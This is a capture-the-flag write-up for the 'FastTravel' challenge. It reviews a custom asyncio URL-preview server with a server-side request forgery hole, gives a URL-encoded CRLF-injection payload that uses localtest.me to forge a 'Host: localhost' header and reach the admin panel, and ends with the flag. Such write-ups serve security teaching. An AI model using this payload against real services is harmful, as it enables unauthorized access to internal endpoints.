---
tags: 
references:
---
# FastTravel
Solves: 
Tags: #ssrf #dns-rebidining #crlf 
## Description
> The paths through the cyber world can be quite long. This is why we have set up a >FastTravel< network to shorten them. To avoid dangers we let you peek through them before you enter.
## Overview
It is an url shortener. Fetches a given url and returns a preview of it.
The server is custom, built with asyncio. Also the parser function are "hand made"
## Road to flag
The flag is in the admin panel, that is accessible only if the request's host header is `localhost`
```python
@server.get("/admin")
async def admin(request: Request) -> Response:
    if not privileged_origin_access(request.headers.get('Host', '')):
        return Response.forbidden()
    return Response.ok(f"Welcome to the secret admin panel! Flag: {FLAG}")
```
## Code review

- SSRF in `/shorten`
```python
@server.post("/shorten")
async def shorten(request: Request) -> Response:
    if "source" not in request.form_args:
        return Response.bad_request()

    url = request.form_args["source"]
    scheme, hostname, port, path = urlparse(url)
    if privileged_origin_access(hostname) or any(hostname.startswith(e) for e in PRIVILEGED_ORIGINS) or any(hostname.endswith(e) for e in PRIVILEGED_ORIGINS):  # just to be sure
        return Response.forbidden()

    global last_shorten
    if SHORTEN_RATE_LIMIT and (datetime.now() - last_shorten) < SHORTEN_RATE_LIMIT:
        print(f"[{datetime.now()}] WARN    Rate limiting shorten")
        to_sleep = (last_shorten + SHORTEN_RATE_LIMIT - datetime.now())
        last_shorten = datetime.now() + to_sleep
        await asyncio.sleep(to_sleep.total_seconds())
    else:
        last_shorten = datetime.now()

    short = "".join(random.choice(string.ascii_letters + string.digits) for _ in range(6))
    try:
        preview = await Requester().get(url)
        if len(preview) > 2**20:
            print(f"[{datetime.now()}] WARN    preview is too large, truncating", len(preview), "to", 2**20)
            preview = preview[:2**16]
    except ConnectionRefusedError:
        return Response.bad_request("Invalid URL")
    shortens[short] = (url, preview)

    return Response.ok(f"{preview}")
```

But the hostname has not to be `localhost` or `localhost:500`, and the hostname has not to start or end with these values.
```python
scheme, hostname, port, path = urlparse(url)
    if privileged_origin_access(hostname) or any(hostname.startswith(e) for e in PRIVILEGED_ORIGINS) or any(hostname.endswith(e) for e in PRIVILEGED_ORIGINS):  # just to be sure
        return Response.forbidden()
```

- `Client.py` - `Requester` sends a request to the given url
```python
class Requester:
    async def request(self, method: Method, url: str, body: Optional[bytes] = None, verbose: bool = False) -> bytes:
        scheme, hostname, port, path = urlparse(url)
        if scheme not in ("http", "https"):
            raise ValueError("Scheme not supported")

        port = port or (443 if scheme == "https" else 80)
        path = path if path else "/"

        loop = asyncio.get_event_loop()
        try:
            addrs = await loop.getaddrinfo(hostname, port, family=socket.AF_INET, type=socket.SOCK_STREAM) # localtest.me
            if not addrs:
                raise ValueError("No address found")
        except socket.gaierror:
            raise ValueError("Address resolution failed")

        family, socktype, proto, canonname, sockaddr = addrs[0]

        try:
            if scheme == "https":
                reader, writer = await asyncio.open_connection(sockaddr[0], sockaddr[1], server_hostname=hostname, ssl=True)
            else:
                reader, writer = await asyncio.open_connection(sockaddr[0], sockaddr[1])
        except ConnectionRefusedError:
            raise ValueError("Connection refused")

        try:
            req = (
                f"{method} {path} HTTP/1.1\r\n"
                f"Host: {hostname}\r\n"
                f"User-Agent: fasttravel/0.1\r\n"
                f"Connection: close\r\n\r\n"
            ).encode("utf-8")
            if body:
                req += body

            writer.write(req)
            await writer.drain()

            response = b""
            while True:
                chunk = await reader.read(4096)
                if not chunk:
                    break
                response += chunk

            if verbose:
                return response
        except:
            raise ValueError("Request failed")

        return self.parse(response)

    def parse(self, response: bytes) -> bytes:
        return response.split(b"\r\n\r\n", 1)[1]  # should be good enough for our usecase

    async def get(self, url: str) -> bytes:
        return await self.request("GET", url)
```
## Exploitation

DNS rebinding + crlf injection `http%3a%2f%2flocaltest.me%3a5001%2fadmin%20HTTP%2f1.1%0d%0aHost%3a%20localhost%0d%0aConnection%3a%20close%0d%0a%0d%0a`

`dach2025{seems_like_you_were_able_to_open_a_forbidden_portal_gd40g18qu16j812a}`